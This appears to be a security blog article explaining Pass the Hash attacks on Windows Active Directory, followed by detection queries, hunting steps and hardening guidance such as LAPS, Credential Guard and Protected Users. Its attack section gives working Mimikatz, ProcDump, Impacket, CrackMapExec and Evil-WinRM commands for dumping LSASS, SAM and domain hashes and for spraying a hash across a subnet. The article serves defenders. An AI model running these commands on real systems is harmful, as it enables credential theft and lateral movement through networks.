---
title: "Pass the Hash"
description: "Pass the Hash explained in depth: NTLM internals, credential dumping methods, lateral movement toolchain, LAPS deployment, Credential Guard, Protected Users, and detection without false positives."
date: 2026-06-12T09:30:00
category: Active-Directory
tags:
  - Active Directory
  - NTLM
  - Lateral Movement
  - Credential Access
  - Threat Hunting
author: "Luca Manfrin"
published: true
archived: false
pinned: false
featured: false
---

## Definition

Pass the Hash (PtH) is a lateral movement technique that exploits the NTLM authentication protocol by substituting a stolen password hash for the plaintext password. Because NTLM derives all session credentials directly from the NT hash, never requiring the plaintext, possessing the hash is functionally identical to possessing the password.

---

## NTLM Authentication Internals, Why This Works

NTLM uses a challenge-response scheme. The server never sees the plaintext password at any point:

1. Client sends a Negotiate message
2. Server responds with a random 8-byte challenge (nonce)
3. Client computes: `NTLM_RESPONSE = HMAC_MD5(NT_HASH, challenge + client_nonce)`
4. Client sends the response to the server
5. Server validates (locally or by forwarding to the DC)

The NT hash is the only secret involved. An attacker who possesses it can compute the correct challenge-response for any future challenge, **no cracking, no plaintext needed**.

The NT hash is computed as: `MD4(UTF-16LE(password))`

---

## How Credentials Are Stored and Where They Are Stolen From

### LSASS (Local Security Authority Subsystem Service)

LSASS is the primary target. Windows caches credentials in LSASS memory to support Single Sign-On without constant re-authentication:

- **WDigest** (legacy, disabled by default since Windows 8.1/2012 R2): stores plaintext credentials in memory
- **NTLM hashes**: always cached for authenticated sessions
- **Kerberos tickets and session keys**: cached in the LSASS credential store
- **DPAPI master keys**: used to decrypt browser-saved passwords

### SAM Database

The Security Account Manager (`C:\Windows\System32\config\SAM`) stores NT hashes for local accounts. It is locked at runtime but can be extracted via Volume Shadow Copy or registry hive dumping.

```cmd
# Registry-based SAM dump (requires SYSTEM)
reg save HKLM\SAM   C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
# Transfer and process offline with impacket secretsdump
```

### NTDS.dit

The Active Directory database (`C:\Windows\NTDS\ntds.dit`) on domain controllers contains NT hashes for all domain accounts.

---

## How an Attacker Performs This Attack

### Phase 1, Gain initial access and escalate to local admin

PtH requires local Administrator rights on the source machine to dump LSASS.

### Phase 2, Dump Credentials

```cmd
# Mimikatz, dump all credentials from LSASS
privilege::debug
sekurlsa::logonpasswords
```

Output (relevant section):
```
Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : john.smith
Domain            : DOMAIN
Logon Server      : DC01
NTLM              : 8846f7eaee8fb117ad06bdd830b7586c
```

```cmd
# Mimikatz, dump only NTLM hashes (quieter)
sekurlsa::msv

# Dump SAM (local accounts)
lsadump::sam

# DCSync, dump domain hashes without touching NTDS.dit on disk
lsadump::dcsync /user:administrator
lsadump::dcsync /domain:domain.local /all /csv
```

```powershell
# Task Manager / ProcDump approach (bypasses some EDR hooks)
# 1. Dump LSASS via ProcDump (signed Microsoft binary)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 2. Process offline with Mimikatz
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

```bash
# CrackMapExec, remote credential dump
crackmapexec smb 192.168.1.50 -u Administrator -p Password123 --sam
crackmapexec smb 192.168.1.50 -u Administrator -p Password123 --lsa
crackmapexec smb 192.168.1.50 -u Administrator -p Password123 --ntds
```

### Phase 3, Lateral Movement with the Hash

```cmd
# Mimikatz, spawn a new process with the hash injected
sekurlsa::pth /user:Administrator /domain:domain.local \
  /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

```bash
# Impacket suite, various protocols
python3 psexec.py   -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50
python3 wmiexec.py  -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50
python3 smbexec.py  -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50
python3 atexec.py   -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50 "whoami"

# Evil-WinRM, WinRM-based shell
evil-winrm -i 192.168.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

```powershell
# CrackMapExec, spray hash across an entire subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# --local-auth = try local account; without it = domain account
```

> [!NOTE]
> The format `-hashes :NTLM` (with a colon prefix and empty LM portion) is standard for Impacket. Some tools require the full LM:NT format: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`. The LM hash is the same for all accounts in modern Windows (it's the hash of an empty string with the LM scheme).

---

## Security Problems

**1. The hash IS the credential.** Password complexity and length are irrelevant once the hash is captured. A 50-character password produces a hash that is exactly as useful for PtH as a 6-character one.

**2. Uniform local admin passwords = total fleet compromise.** If every machine shares the same local Administrator password (common before LAPS), one compromised workstation unlocks all of them.

**3. LSASS is a universal target.** Every authenticated session leaves credentials in LSASS. A domain admin who logs onto a workstation once deposits their hash there.

**4. PtH over SMB looks like normal traffic.** NTLM authentication over SMB (port 445) is routine. An attacker using a stolen hash authenticates identically to the legitimate user.

**5. No password lockout.** Hash injection bypasses the standard authentication path. Lockout policies apply to password-based authentication, not hash injection.

**6. NTLM relay chains amplify PtH.** A captured NTLM challenge-response can be relayed to another service without even needing the hash itself (NTLM relay / Responder).

---

## How to Detect It

### Event-Based Detection

```powershell
# NTLM network logons (LogonType=3, AuthPackage=NTLM)
# Flag workstation-to-workstation NTLM, this is the PtH pattern
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object {
    $_.Properties[8].Value  -eq 3      -and  # LogonType = Network
    $_.Properties[10].Value -eq 'NTLM'        # AuthPackage
  } |
  Select-Object TimeCreated,
    @{ n = 'Account';        e = { $_.Properties[5].Value } },
    @{ n = 'WorkStation';    e = { $_.Properties[11].Value } },
    @{ n = 'SourceIP';       e = { $_.Properties[18].Value } },
    @{ n = 'ElevatedToken';  e = { $_.Properties[26].Value } } |
  Where-Object {
    # Flag: source IP is a workstation subnet, not a server or DC
    $_.SourceIP -match '^10\.10\.'   # adjust to your workstation subnet
  }
```

```powershell
# Detect RID-500 (built-in Administrator) NTLM logons from unusual sources
# RID-500 is the most frequently reused hash across machines
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object {
    $_.Properties[10].Value -eq 'NTLM' -and
    $_.Properties[4].Value -match '-500$'   # SID ending in -500 = RID 500
  } |
  Select-Object TimeCreated,
    @{ n = 'AccountSID'; e = { $_.Properties[4].Value } },
    @{ n = 'SourceIP';   e = { $_.Properties[18].Value } }
```

```powershell
# Detect LSASS access via Sysmon (Event 10, ProcessAccess)
# GrantedAccess values used by credential dumpers:
# 0x1010 = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ
# 0x1410 = above + PROCESS_DUP_HANDLE
# 0x1fffff = PROCESS_ALL_ACCESS (very suspicious)
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 10
} | Where-Object {
  $_.Properties[4].Value  -like '*lsass*' -and
  $_.Properties[9].Value  -match '0x1(0|4)10|0x1fffff|0x143a'
} |
  Select-Object TimeCreated,
    @{ n = 'SourceProcess'; e = { $_.Properties[5].Value } },
    @{ n = 'SourcePID';     e = { $_.Properties[6].Value } },
    @{ n = 'GrantedAccess'; e = { $_.Properties[9].Value } }
```

### NTLM Audit Logging

Enable NTLM auditing before trying to baseline or reduce it:

```
Group Policy: Computer Configuration → Windows Settings → Security Settings →
  Local Policies → Security Options →
  Network Security: Restrict NTLM: Audit Incoming NTLM Traffic → Enable auditing for all accounts
  Network Security: Restrict NTLM: Audit NTLM authentication in this domain → Enable all
```

```powershell
# Review NTLM audit events (Event 8004 = NTLM pass-through)
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-NTLM/Operational'; Id = 8004
} | Select-Object TimeCreated,
    @{ n = 'User';       e = { $_.Properties[1].Value } },
    @{ n = 'Workstation';e = { $_.Properties[2].Value } },
    @{ n = 'DomainCtrl'; e = { $_.Properties[3].Value } }
```

---

## Honeypot Account Strategy for PtH Detection

The equivalent of a honey SPN for PtH is a **honey user account** with a unique NTLM hash that is never used for legitimate authentication. Any successful NTLM authentication using this account's hash is an immediate alert.

```powershell
# Create a honey local admin account on each machine via GPO/LAPS
# Or create a honey domain account that is disabled for interactive use
New-ADUser `
  -Name "svc_monitoring_ro" `
  -SamAccountName "svc_monitoring_ro" `
  -AccountPassword (ConvertTo-SecureString "Q#9mX!3kP@7vL&2nZ^5rW*" -AsPlainText -Force) `
  -Enabled $true

# Deny all logon rights except interactive (so it can't actually log on anywhere legitimate)
# Via GPO: User Rights Assignment → Deny access to this computer from the network

# Alert: any 4624 (LogonType 3) for this account = PtH indicator
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object {
    $_.Properties[5].Value -eq 'svc_monitoring_ro' -and
    $_.Properties[8].Value -eq 3
  }
```

---

## How to Hunt It (Post-Incident)

### Phase 1, Map lateral NTLM patterns

```powershell
# Build a matrix: who authenticated via NTLM to where, over the last 7 days
$start = (Get-Date).AddDays(-7)
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'; Id = 4624; StartTime = $start
} | Where-Object {
  $_.Properties[8].Value  -eq 3 -and
  $_.Properties[10].Value -eq 'NTLM'
} | Select-Object TimeCreated,
    @{ n = 'User';   e = { $_.Properties[5].Value } },
    @{ n = 'Source'; e = { $_.Properties[18].Value } },
    @{ n = 'Target'; e = { $env:COMPUTERNAME } } |
  Group-Object User |
  ForEach-Object {
    $uniqueSources = $_.Group | Select-Object -ExpandProperty Source | Sort-Object -Unique
    [PSCustomObject]@{
      User    = $_.Name
      Sources = $uniqueSources -join ', '
      Count   = $_.Group.Count
    }
  } | Sort-Object Count -Descending
```

### Phase 2, Check for ProcDump / minidump artifacts

```powershell
# Search for LSASS dump files
Get-ChildItem -Path C:\ -Recurse -Include "*.dmp", "lsass*" `
  -ErrorAction SilentlyContinue | Where-Object {
    $_.Length -gt 10MB   # LSASS dumps are large
  } | Select-Object FullName, Length, LastWriteTime
```

### Phase 3, Identify machines with identical local admin hashes (LAPS not deployed)

If LAPS is not deployed, check for machines where the local admin hash appears on multiple systems (indicating a shared password that could be reused for PtH across the fleet).

```bash
# CrackMapExec, identify reused hashes across subnets
# If the same hash succeeds on multiple machines, LAPS is not deployed
crackmapexec smb 192.168.1.0/24 -u Administrator -H <captured_hash> --local-auth
```

---

## How to Prevent It

### 1. Deploy LAPS (Local Administrator Password Solution)

LAPS generates a unique random local Administrator password for each machine and stores it in AD. This eliminates lateral movement via shared local admin hashes.

```powershell
# Modern LAPS (Windows LAPS, built into Windows 11/2022)
# Check if Windows LAPS is available
Get-WindowsCapability -Online -Name "Rsat.ActiveDirectory*"

# Enable Windows LAPS in AD
Update-LapsADSchema
Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=domain,DC=local"

# Configure via GPO:
# Computer Configuration → Administrative Templates → System → LAPS
# Set: Directory Services Backup Mode → AD
# Set: Password Complexity → Large letters + small letters + numbers + specials
# Set: Password Length → 20+
# Set: Maximum Password Age → 30 days

# Retrieve a machine's LAPS password (requires delegation)
Get-LapsADPassword -Identity "WORKSTATION01" -AsPlainText
```

```powershell
# Legacy LAPS (Microsoft LAPS), still widely deployed
# Check LAPS deployment
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Where-Object { -not $_.'ms-Mcs-AdmPwd' } |
  Select-Object Name   # machines without LAPS passwords
```

### 2. Enable Credential Guard

Credential Guard uses Virtualization-Based Security (VBS) to run LSASS in a protected environment (VSM, Virtual Secure Mode). Credential material in the protected LSASS cannot be read by processes running in the normal OS.

```powershell
# Enable via registry (requires UEFI, Secure Boot, and VT-x/AMD-V)
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
  -Name "EnableVirtualizationBasedSecurity" -Value 1 -Type DWord

Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
  -Name "RequirePlatformSecurityFeatures" -Value 1 -Type DWord

Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "LsaCfgFlags" -Value 1 -Type DWord  # 1=enabled without UEFI lock, 2=with UEFI lock

# Verify
Get-CimInstance -ClassName Win32_DeviceGuard `
  -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesRunning
# 1 = Credential Guard running
```

> [!WARNING]
> Credential Guard has compatibility requirements: UEFI firmware, Secure Boot enabled, no 3rd-party security products that hook LSASS, no WHQL-uncertified drivers. Test thoroughly before broad deployment. Some older applications that use custom credential providers will break.

### 3. Enable LSA Protection (Protected Process Light)

PPL marks LSASS as a protected process, kernel-mode code and user-mode code cannot inject into it without a valid Microsoft-signed driver.

```powershell
# Enable LSA PPL
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "RunAsPPL" -Value 1 -Type DWord
# Requires reboot

# Via Group Policy:
# Computer Configuration → Windows Settings → Security Settings →
#   Local Policies → Security Options →
#   Local Security Authority (LSA) protection
```

> [!NOTE]
> PPL stops most user-mode dumping tools (Task Manager, ProcDump without a valid certificate). It does NOT stop kernel-mode attackers with a signed driver. Advanced threat actors bypass PPL with kernel exploits or vulnerable drivers (BYOVD).

### 4. Add Privileged Accounts to the Protected Users Group

Members of Protected Users:
- Cannot authenticate via NTLM (forced to use Kerberos)
- Cannot use DES or RC4 for Kerberos
- Cannot have credentials cached locally
- TGTs limited to 4-hour lifetime, no renewal

```powershell
# Add all Domain Admins to Protected Users
Get-ADGroupMember 'Domain Admins' -Recursive |
  Where-Object { $_.objectClass -eq 'user' } |
  ForEach-Object { Add-ADGroupMember -Identity 'Protected Users' -Members $_ }

# Verify
Get-ADGroupMember 'Protected Users' | Select-Object SamAccountName
```

> [!WARNING]
> Protected Users membership permanently disables NTLM for those accounts everywhere. Applications using NTLM for these accounts will break immediately. Do not add service accounts that use NTLM until you have confirmed Kerberos works for every system they authenticate to.

### 5. Restrict NTLM, Phase It Out

```powershell
# Phase 1: Audit mode (log all NTLM, do not block)
# Group Policy: Network Security: Restrict NTLM:
#   Incoming NTLM traffic → Audit All
#   NTLM authentication in this domain → Audit All

# Phase 2: Block NTLM from workstations to servers
# Network Security: Restrict NTLM: Outgoing NTLM traffic to remote servers
#   → Deny All (on workstations via GPO targeting Workstation OU)

# Phase 3: Block NTLM domain-wide (after full AES/Kerberos validation)
# Network Security: Restrict NTLM:
#   Incoming NTLM traffic → Deny All Domain Accounts
```

---

## Conclusion

Pass the Hash exploits a 30-year-old protocol design where the hash is the password. LAPS eliminates the most impactful attack path (reused local admin hashes across the fleet) and should be your first deployment. Credential Guard seals LSASS on modern hardware. Protected Users eliminates NTLM for privileged accounts at the protocol level. The detection story depends heavily on baselining NTLM traffic, you cannot alert on anomalies you have never measured.
